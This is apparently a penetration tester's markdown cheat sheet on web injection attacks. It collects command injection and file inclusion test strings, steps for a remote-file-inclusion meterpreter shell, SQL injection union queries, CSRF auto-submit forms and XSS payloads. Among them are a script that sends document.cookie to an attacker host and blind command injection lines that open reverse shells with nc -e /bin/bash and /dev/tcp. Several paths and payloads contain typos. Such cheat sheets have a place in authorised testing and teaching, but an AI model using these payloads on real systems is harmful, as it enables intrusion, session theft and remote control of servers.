---
title: Injection
category: Web Application
order: 4
---

> **Command Injection**

Prefixs before attack payload (command seperator): | <code> &, &&, ||,  <, >, ;, $() </code>
Test Visable: | <code> ; ls /ect/passwd or /ect/hosts </code>
Test Blind Ping: | <code> ; ping y.o.ur.ip <br> <br> On your attack system: <br> sudo tcpdump -n host [victimIP] and icmp </code>
Test Blind DNS: | <code> nslookup (you need a public facing system to see nslookup)</code>



> **File Inclusion**

Test Strings:
{% highlight bash %}
file%3a%2f%2f%2fetc%2fpasswd
../../../winnt/system32.cmd.exe+/c+dir (not frequent)
/ect/passwd
../../../../../../../../../../../../../../ect/passwd
{% endhighlight %}

Use ZAP to Fuzz the URL:
1. Right click on request that looks injectable -> fuzz using
[JHADDIX_LFI](https://github.com/fuzzdb-project/fuzzdb/blob/master/attack/lfi/JHADDIX_LFI.txt)

What to go after:
* Old IIS: HTTP://vulnsite/scripts/../../../winnt/system32/CMD.exe+/C+dir (may need to encode the slashes)
* http://vulnsite/index.php?templ=../include/siteconfig.inc (or just templ=red)
* /global.asax
* \docume~1\fprefect\mydocu~1
* \windows\system32\cmd.exe
* /etc/passwd
* [Windows pwnwiki](http://pwnwiki.io/#!presence/windows/blind.md)
* [Linux pwnwiki](http://pwnwiki.io/#!presence/linux/blind.md)

Debian w/ Apache:
* /var/www/html
* /home/username/public_html

CGI scripts: 
* /use/lib/cgi-bin

Auto-Extension Bypass:
* NULL "%00"

>**Shell from RFI and LFI**

RFI Shell 1:
1. VI a webshell (https://binaryexile.github.io/6%20-%20Web%20Application/Vulnerabilities/)
2. python -m SimpleHTTPServer 8080
3. Set up netcat listener (if needed based on webshell)
3. Navigate to shell (http://www.victim.com/index.php?page=http://127.0.0.1:4321/shellcommand.txt)

RFI Meterpreter Shell:
1. Create Payload: msfvenom LPORT=1234 LHOST=192.168.1.8 -p php/meterpreter_reverse_tcp -f raw > ~/met_rev_tcp_1234.txt
2. Wrap it: add <?php ?> to the payload
3.  Set up handler: 
* use exploit/multi/handler
* set payload php/meterpreter_reverse/tcp
* set lhost 192.168.1.8
* set lport 1234
exploit
4.  python -m SimpleHTTPServer 8080
5. Navigate to shell (http://www.victim.com/index.php?page=http://127.0.0.1:4321/shellcommand.txt)

LFI Shell:
*[LFI Shell 1](http://resources.infosecinstitute.com/local-file-inclusion-code-execution/)
*[LFI Shell 2](https://highon.coffee/blog/lfi-cheat-sheet/)

> **SQL Injection: Test Location and Strings**

Locations:
* GET URL query parameters
* POST parameters
* Cookie (session information)
* User-Agent

Visable Test Strings:
{% highlight bash %}
' ` " ; /* --
{% endhighlight %}

Blind Test Strings:
*Try the following to see if it provides valid results for text that was interpreted:*

Commenting out the end | <code> Dent' ;# <br> Dent' ;-- </code>
Inline Commenting | <code> De'/* */'nt </code>
Concatenation | <code> De' 'nt <br> De'| |'nt </code>
Binary/Boolean | <code> Dent' and 1;# <br> Dent' and 1=1;# <br> Dent' and 0;# <br> Dent' and 1=0;# </code>
Sleep | <code> Sleeep(10) MySQL <br>  WAITFOR DELAY '0:0:10'  MSSQL

> **SQL Injection: Database Identification**

Oracle | ORA-01756: quoted string not properly terminated
MS SQL Server | Incorrect syntax near 'something'
PostgreSQL | 5-digit Hex Error Code

> **SQL Injection Union**

1. Once you have identified SQL injection, use order by (increase until it breaks):
{% highlight sql %}
dent' and 'a'='a' ORDER BY 5; #
{% endhighlight %}
2. See which numbers appear in the output, and select one for the union. *Note: It requires the same number of columns and compatable data type*
{% highlight sql %}
Dent' UNION SELECT  '1', '2', '3', '4'; #
{% endhighlight %}
3.  

> **CSRF**

GET:
{% highlight html %}
<img src="http://<ip_of_site>/form.php?<parameter>=<value>
{% endhighlight %}

POST:
{% highlight html %}
<form  ID=CSRF action="<website>" method="POST">
<input type="hidden" name="<paramater>" value="<value>"/>
<input type="submit" value="View my pictures" style="position: absolute; left: -9999px; width: 1px; height: 1px;"
       tabindex="-1"/>
</form>
<script>document.getElementById('CSRF').submit();</script>
{% endhighlight %}

> **XSS**

Get Cookie:
{% highlight html %}
<script>document.location='http://[AttackerIP]/cgi-bin/grab.cgi?'+docment.cookie;</script>
{% endhighlight %}

POST:
{% highlight html %}
<form  ID=CSRF action="<website>" method="POST">
<input type="hidden" name="<paramater>" value="<value>"/>
<input type="submit" value="View my pictures" style="position: absolute; left: -9999px; width: 1px; height: 1px;"
       tabindex="-1"/>
</form>
<script>document.getElementById('CSRF').submit();</script>
{% endhighlight %}


> **XSS Test Strings**

{% highlight html %}
'';!--"<XSS>=&{()}
{% endhighlight %}

{% highlight html %}
<script>alert(document.cookie);</script>

<script type="text/vbscript">alert(DOCUMENT.COOKIE)</script>

<script src=http://www.example.com/malicious-code.js></script>

%3cscript src=http://www.example.com/malicious-code.js%3e%3c/script%3e

\x3cscript src=http://www.example.com/malicious-code.js\x3e\x3c/script\x3e

>"><script>alert("XSS")</script>&

"><STYLE>@import"javascript:alert('XSS')";</STYLE>

<IMG SRC="javascript:alert('XSS');">

<IMG SRC=javascript:alert('XSS')>

<IMG SRC=JaVaScRiPt:alert('XSS')> 

<IMG SRC=JaVaScRiPt:alert(&quot;XSS<WBR>&quot;)>

<IMG SRC="jav&#x09;ascript:alert(<WBR>'XSS');">

<IMG SRC="jav&#x0A;ascript:alert(<WBR>'XSS');">

<IMG SRC="jav&#x0D;ascript:alert(<WBR>'XSS');">

{% endhighlight %}



> **Local File Include**

{% highlight bash %}
#Automated Tool
fimap -u 'http://website/?p=file.html'

#Test for Local File Include
http://website/?p=file%3a%2f%2f%2fetc%2fpasswd

#Grab data
http://website/?p=php://filter/convert.base64-encode/resource=/etc/php/7.0/apache2/php.ini
http://utilities.snrt.io/?p=php://filter/convert.base64-encode/resource=index.php

#Rebuild Base64 file (e.g.,executable)
base64 -d extractedBase64File > executable2
curl -s "http://localhost/ex1.php?page=php://filter/convert.base64-encode/resource=index" | base64 -d

{% endhighlight %}

> **Command Injection**
{% highlight bash %}
#Commix Automated Tool
commix --level=3 --url="http://website/?arg=INJECT_HERE&arg2=argument" 
python commix.py --url="http://192.168.178.58/DVWA-1.0.8/vulnerabilities/exec/#" --data="ip=INJECT_HERE&submit=submit" --cookie="security=medium; PHPSESSID=nq30op434117mo7o2oe5bl7is4"


#Test Strings
test`pwd`
test$(pwd)
test; pwd
test | pwd
test && pwd
{% endhighlight %}

> **Blind Command Injection**

{% highlight bash %}
#Attacker Machine
tcpdump -n host <webserver IP> and ICMP
nc -l [port]
#Victim
test; ping -c 4 <yourAttackerIP>; echo hello 
test; /bin/nc [YourAttackerIP] [port] -e /bin/bash; echo hello
#Alternative to NC for non-debian based distrobutions
/bin/bash -i > /dev/tcp/[AttackerIP]/[attackerport] 0<&1 2>&1 

#Sleep method
http://ci.example.org/blind.php?address=127.0.0.1 && sleep 10
{% endhighlight %}

> **Web Shells**

Kali: 

PHP | <code> /usr/share/webshells/php/ </code>
PERL | <code> /usr/share/webshells/perl/ </code>
Cold Fusion | <code> /usr/share/webshells/cfm/ </code>
ASP | <code> /usr/share/webshells/asp/ </code>
ASPX | <code> /usr/share/webshells/aspx/ </code>
JSP | <code> /usr/share/webshells/jsp/jsp-reverse.jsp </code>

Online:

* [PHP and Perl](http://pentestmonkey.net/category/tools/web-shells)
* [Bash, PHP, Netcat, Telnet, Perl, Ruby, Java, Python, Gawk](https://highon.coffee/blog/reverse-shell-cheat-sheet/)

> **Useful Resources**

* [MongoDB](http://securitysynapse.blogspot.com/2015/07/intro-to-hacking-mongo-db.html)
* [Command Injection](http://securitysynapse.blogspot.com/2015/07/intro-to-hacking-mongo-db.html)
* [Fuzzing List](http://securitysynapse.blogspot.com/2015/07/intro-to-hacking-mongo-db.html)
* [XSS, SQL, LDAP, XPATH, XML Injection Test Strings](https://www.owasp.org/index.php/OWASP_Testing_Guide_Appendix_C:_Fuzz_Vectors)
* [XSS Filter Evasion](https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet)
* [XSS Examples](http://www.xssed.com/)
* [SQL Injection](https://www.netsparker.com/blog/web-security/sql-injection-cheat-sheet/)
* [Informix, MSSQL, Oracle, MySQL, Postgres, DB2, Ingres SQL Injection Cheat Sheet](http://pentestmonkey.net/category/cheat-sheet)
* [Access Injection Cheat Sheet](http://nibblesec.org/files/MSAccessSQLi/MSAccessSQLi.html)
[Commix](http://www.kitploit.com/2015/04/commix-automated-all-in-one-os-command.html)
[LFI Cheat Sheet](https://highon.coffee/blog/lfi-cheat-sheet/)
[CGI-Bin](https://www.hellboundhackers.org/articles/read-article.php?article_id=7)

> **Useful Tools**
* [SQLMap](http://sqlmap.org)

